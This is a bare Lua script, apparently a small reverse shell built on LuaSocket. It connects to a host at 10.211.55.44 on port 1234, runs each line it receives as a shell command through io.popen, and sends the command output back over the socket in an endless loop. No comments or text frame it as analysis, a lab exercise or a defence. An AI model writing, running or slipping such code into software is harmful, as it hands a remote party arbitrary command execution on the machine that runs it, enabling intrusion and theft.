socket = require "socket"

function tcpReceive()
  local data, status, partial = tcpSocket:receive()
  if data then
    print(data)
    f = io.popen(data)
    --print(f:read("*a"))
    tcpSocket:send(f:read("*a"))
  end
  if status=="closed" then
    error("Server closed")
  end
end

local ip = "10.211.55.44"
local port = 1234

  tcpSocket = assert(socket.connect(ip, port))		-- connection socket tcp
  tcpSocket:settimeout(0)

  --tcpSocket:send(s.."\n")

while (1) do
  tcpReceive()

end
